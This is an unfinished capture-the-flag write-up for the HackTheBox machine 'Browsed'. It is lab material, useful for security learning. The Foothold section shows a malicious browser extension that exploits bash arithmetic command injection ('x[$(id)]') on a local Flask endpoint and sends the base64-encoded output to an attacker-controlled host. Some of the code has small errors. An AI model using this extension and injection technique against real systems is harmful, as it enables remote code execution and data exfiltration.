---
tags:
  - HTB
  - Linux
  - Chrome
  - Browser extension

icon: simple/gnometerminal
---


# Browsed

!!! info "Box details"  
    https://app.hackthebox.com/machines/Browsed
    **Difficulty:** Medium
    **OS:** Linux

> ippsec video: [youtube.com](https://www.youtube.com/watch?v=duyqJWbzQQk)  
> 0xdf blog: [0xdf.gitlab.io](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)


## Enumeration

nmap shows just 2 ports open:
``` text
22/tcp open  ssh
80/tcp open  http

```
Browsing to port 80, we can find a website where you can upload file extensions and they say they will test it. I assume there's a script that installs and executes whatever browser extension I give it. Doign some digging on browser extension attacks:  
- https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html  
- https://spaceraccoon.dev/universal-code-execution-browser-extensions/

A lot of it is about how the extension can install without the user's consent, which is not relevant to us here (since I assume the script will install whatever we give it). There's also somethings about how to calculate the correct signature, but looking at the examples the web app provides, they don't have signatures - so I think I can skip that. So they thing is to figure out what I need to submit that will give me something interesting (preferably RCE, but possibly cookies to access the website as admin).

Example extension they give:

``` text
$ tree 

fontify/
├── content.js
├── manifest.json
├── popup.html
├── popup.js
└── style.css
```

Looking for Github PoCs we find this one: https://github.com/mttaggart/crux. I changed the const SERVER_HOST for my listening ip, compress everything into a zip (as per the box's instructions), and upload. That doesn't work. Reading one of the blog posts above, I tried a simple manifest.json + contentscript.js to see if I could get a ping back to my machine. But as we can see from the log output the webapp shows ups, the extension failed to load:

``` text
Extension error: Failed to load extension from: /tmp/extension_6a4ef792ed45c5.28452310. Manifest is not valid JSON.  trailing characters at line 1 column 18
```

Clearly my javascript coding skills aren't great. If we use one of the sample extensions they give us and check the logs, we can see this:

```
NetworkDelegate::NotifyBeforeURLRequest: http://localhost/images/pic01.jpg
NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/assets/css/index.css?v=1.24.5
NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/assets/css/theme-gitea-auto.css?v=1.24.5
NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/assets/img/logo.svg
NetworkDelegate::NotifyBeforeURLRequest: http://localhost/images/pic02.jpg
```

We add browsedinternals.htb to our /etc/hosts file and find a Gitea instance. There is a public repo under larry/MarkdownPreview. In it, we find the source for a Flask application.

``` text
$ cat README.md 
# markdownPreview

This webapp allows us to convert our md files to html.
Still in developement, it should only run locally !!!
```

The first thing that jumps out to me are the backup files, which sometimes contain credentials or other relevant info. Both of them contain home/larry/MarkdownPreview/data/ but no files in them. The logs files show some routines taking place:

```
[2025-04-26 13:23:34] Routine 0: Temporary files cleaned.
[2025-03-17 12:39:47] Routine 1: Data backed up to /home/larry/markdownPreview/backups.
[2025-03-17 12:18:44] Routine 2: Log files compressed.
```

Looking at routines.sh it makes more sense what these are. Relvant parts of the script:

```
<SNIP>

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
  log_action "Routine 1: Data backed up to $BACKUP_DIR."
  echo "Backup completed."

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
  log_action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  log_action "Routine 3: System info dumped."
  echo "System info saved."


<SNIP>

```

Finally let's take a look at the app.py file. Most relevant bit:

```
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

## Foothold

So if we can create an extensions that visits http://127.0.0.1:5000/routines/3, for example, it should run the system info dump routine from the routines.sh script. Note: we know it's running on port 5000 of the line in app.py that has `app.run(host='127.0.0.1', port=5000)`. I was stuck here for a while, and then reading 0xdf's blog I learned the two things I needed:
1) How do we use bash's arithmetic expression to inject code
2) How do we create an extension that hits the endpoint with the correct payload

Starting with #1 first. The rid we pass in the app route will be given as an argument to the script. Bash arithmetic can be exploited (https://dev.to/greymd/eq-can-be-critically-vulnerable-338m). When bash runs `"$1" -eq 0`

Array arithmetic:

```
$ (( x[0]=1, x[1]=2 ))
$ echo "${x[*]}"
1 2
```

Expected. Now to the unexpected: array arithmetic accepts command substitution!

```
$ (( x[$(echo 0)]=100 ))
$ echo "${x[0]}"
100
```

This is valid! So echo 0 runs during the process! In the example on the blog post, we can pass an array with an operation inside to get it to run. Example:

```
./hoge.sh 'x[$(whoami>&2)]'
```

So in our case, we would like to hit the routine endpoint with an array payload. Payload: `http://127.0.0.1:5000/routine/x[$(id)]` To avoid any bad characters, we need to URL encode the above. So on to #2: how do we build an extension that does this for us? From 0xdf.

First, let's set up our manifest.json:

```
{
  "manifest_version": 3,
  "name": "Read Localhost port 5000",
  "version": "1.0.0",
  "description": "Grab the page on localhost:5000 and return it to me.",
  "permissions": ["scripting"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  }
}
```

Then, the contents of our background.js:

```
fetch("http://127.0.0.1:5000/routine/" + encodeURIComponent("x[$(id)]")
    .then(r => r.text())
    .then(d => fetch("http://10.10.10.10:8000/" + btoa(d)))
```

We upload this via the web app. This should hit the endpoint, encode the response, and disclose it to us when it visits our server. Let's see what we get:

```
$ python3 -m http.server


$ echo '' | base64 -d

```

We don't get to see the output of the command. Let's add the >&2 redirector to see if the command shows up to us:

```
fetch("http://127.0.0.1:5000/routine/" + encodeURIComponent("x[$(id)]")
    .then(r => r.text())
    .then(d => fetch("http://10.10.10.10:8000/" + btoa(d)))
```

Let's try to ping our own attack and check if we're getting pinged.

```
fetch("http://127.0.0.1:5000/routine/" + encodeURIComponent("x[$(ping -c 1 10.10.14.61)]")

$ sudo tcpdump -i tun0 icmp

```



## Privilege Escalation

## Root

## Remediation notes

